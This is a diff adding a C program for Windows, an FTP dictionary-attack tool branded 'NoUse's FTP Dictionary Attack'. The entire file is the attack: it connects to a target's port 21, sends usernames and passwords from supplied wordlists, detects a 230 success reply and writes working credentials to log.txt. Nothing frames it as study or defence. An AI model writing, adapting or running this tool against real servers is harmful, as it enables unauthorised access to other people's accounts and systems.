@@ -1,0 +1,180 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <winsock.h>
+
+#define FTP 21
+
+void usage(char *boo);
+int startWinsock(void);
+
+int main(int argc, char **argv)
+{
+  int sox, count_good = 0, count_bad = 0;
+ 
+  struct hostent *h;
+  struct sockaddr_in target;
+ 
+  char rec_buf[65535];
+  char u_name[34], u_send[39];
+  char p_word[34], p_send[39];
+ 
+  FILE *u_list, *p_list, *log;
+ 
+  memset(u_name, '\0', 34);
+  memset(p_word, '\0', 34);
+  memset(u_send, '\0', 39);
+  memset(p_send, '\0', 39);
+  memset(rec_buf, '\0', 65535);
+ 
+  if(argc != 4)
+  {
+    usage(argv[0]);
+    return -1;
+  }
+ 
+  u_list = fopen(argv[2], "r");
+  p_list = fopen(argv[3], "r");
+  log = fopen("log.txt", "w+");
+ 
+  if(u_list == 0)
+  {
+    printf("[-] Error opening user name list. Check the list and try again\n");
+    return -1;             
+  }
+ 
+  if(p_list == 0)
+  {
+    printf("[-] Error opening password list. Check the list and try again\n");
+    return -1;             
+  }
+ 
+  if(log == 0)
+  {
+    printf("[-] Error opening log file. Can't write results without log.txt\n");
+    return -1;             
+  }
+ 
+  printf("|-------------------------------------|\n");
+  printf("*    NoUse's FTP Dictionary Attack    *\n");
+  printf("|-------------------------------------|\n\n");
+  printf("\n[~] Starting Winsock\n");
+ 
+  if(startWinsock() == -1)
+  {
+    printf("[-] Unable to start Winsock\n");
+    return -1;
+  }
+ 
+  sox = socket(AF_INET, SOCK_STREAM, 0);
+  target.sin_family = AF_INET;
+  target.sin_addr.s_addr = inet_addr(argv[1]);
+ 
+  if (target.sin_addr.s_addr == -1)
+  {
+    h = gethostbyname(argv[1]);
+    if (h != NULL)
+    {
+      target.sin_addr = *((struct in_addr *)h->h_addr);
+    }
+    else
+    {
+      printf("Error querying host.\n");
+      return -1;
+    }
+  } 
+ 
+  target.sin_port = htons(FTP);  //port 21
+  memset(&(target.sin_zero), '\0', 8);
+ 
+  if(sox == -1)
+  {
+    printf("[-] Error opening socket\n");
+    WSACleanup();
+    return -1;       
+  }
+ 
+  printf("[+] Socket opened\n");
+
+  if(connect(sox, (struct sockaddr *)&target, sizeof(struct sockaddr)) == -1)
+  {
+    printf("[-] Host not up. Check IP and try again\n");
+    closesocket(sox);
+    WSACleanup();
+    return -1;
+  }
+ 
+  printf("[+] Connected to %s\n", h->h_name);
+  printf("[~] Starting Dictionary Attack\n");
+ 
+/* main while loop */
+  while((fgets(u_name, 34, u_list)) != NULL && (fgets(p_word, 34, p_list)) != NULL)
+  {
+    sleep(500);
+    sprintf(u_send, "USER %s\r\n", u_name);
+    send(sox, u_send, strlen(u_send), 0);
+    printf("[~] Username sent\n");
+       
+    sleep(700);
+    sprintf(p_send, "PASS %s\r\n", p_word);
+    send(sox, p_send, strlen(p_send), 0);
+    printf("[~] Password sent\n"); 
+   
+    if(recv(sox, rec_buf, sizeof(rec_buf), 0) == 0)
+    {
+      closesocket(sox);
+      printf("\nError with host / They closed the connection!\n");
+      return -1; 
+    }
+   
+    if(recv(sox, rec_buf, sizeof(rec_buf), 0) == SOCKET_ERROR)
+    {
+      closesocket(sox);
+      printf("\nError receiving!\n");
+      return -1;             
+    }
+   
+    if(strstr(rec_buf, "230") != NULL)
+    {
+      printf("\n\n[+] %s:%s is a working combo!", u_name, p_word);
+      printf("\nNow writing to log.txt...");
+      fprintf(log, "%s:%s\n", u_name, p_word);
+      count_good++;
+    }
+    else
+    {
+      printf("[-] %s:%s is an incorrect combo\n", u_name, p_word); 
+      count_bad++;
+    }
+  } 
+ 
+  printf("[-] Attack finished\n");
+  printf("\n[+] %d attempts successful\n", count_good);
+  printf("[-] %d attempts failed\n", count_bad);
+ 
+  closesocket(sox);
+  WSACleanup();
+  fclose(log);
+  fclose(u_list);
+  fclose(p_list);
+  return 0;           
+}
+
+int startWinsock()
+{
+  WSADATA wsaData;       
+  if (WSAStartup(MAKEWORD(1, 1), &wsaData) != 0)
+  {
+    return -1;
+  }
+  printf("[+] Winsock started\n");
+  return 0;
+}
+
+void usage(char *boo)
+{
+  printf("|-------------------------------------|\n");
+  printf("*    NoUse's FTP Dictionary Attack    *\n");
+  printf("|-------------------------------------|\n\n");
+  printf("Usage: %s <ip> <username list> <pass list>\n", boo);
+} 
